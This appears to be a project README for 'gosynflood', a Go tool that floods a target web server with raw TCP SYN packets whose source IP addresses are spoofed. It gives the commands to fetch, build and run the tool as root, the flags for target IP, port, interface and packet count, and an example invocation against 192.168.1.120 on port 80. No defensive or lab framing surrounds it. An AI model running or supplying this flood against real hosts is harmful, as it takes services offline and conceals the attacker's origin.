
###### gosynflood - Repeatedly Send Raw TCP SYN Packets

<pre>
  <code>
# get the project
go get github.com/rootVIII/gosynflood


# Navigate to project root and build:
go build .

# raw sockets require root privileges when executing:
sudo ./gosynflood \
    -t &lt;target IPV4 address&gt; \
    -p &lt;port number&gt; \
    -i &lt;network interface&gt;
    -n &lt;number of packets&gt;

# Example:
sudo ./gosynflood -t 192.168.1.120 -p 80 -i wlp3s0 -n 500
  </code>
</pre>

<pre>
  <code>
-t private or public IP address of webserver
-p port number (not required (defaults to port 80 if not provided)
-i network interface (run program without -i to see found interfaces)
-n number of TCP packets to send (defaults to 1000 if not provided)
  </code>
</pre>

Each packet's IP address is spoofed. MAC addresses are not spoofed however.
